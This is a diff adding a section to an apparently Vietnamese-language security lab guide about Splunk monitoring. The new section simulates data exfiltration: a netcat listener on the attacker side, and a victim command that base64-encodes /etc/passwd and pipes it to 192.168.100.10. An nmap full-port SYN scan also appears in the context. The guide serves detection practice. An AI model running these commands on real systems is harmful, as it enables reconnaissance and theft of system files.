@@ -119,3 +119,15 @@ sudo /opt/splunkforwarder/bin/splunk restart
 nmap -sS -T4 -p- 192.168.100.20
 ```
 
+
+2. **Mô phỏng trích xuất thông tin từ máy nạn nhân**
+
+- Mô phỏng việc mã hóa và gửi nội dung file hệ thống nhạy cảm tới kẻ tấn công thông qua `netcat`
+
+```
+# Attacker
+nc -lvnp 5555
+
+# Victim
+cat /etc/passwd | base64 | nc 192.168.100.10 5555
+```
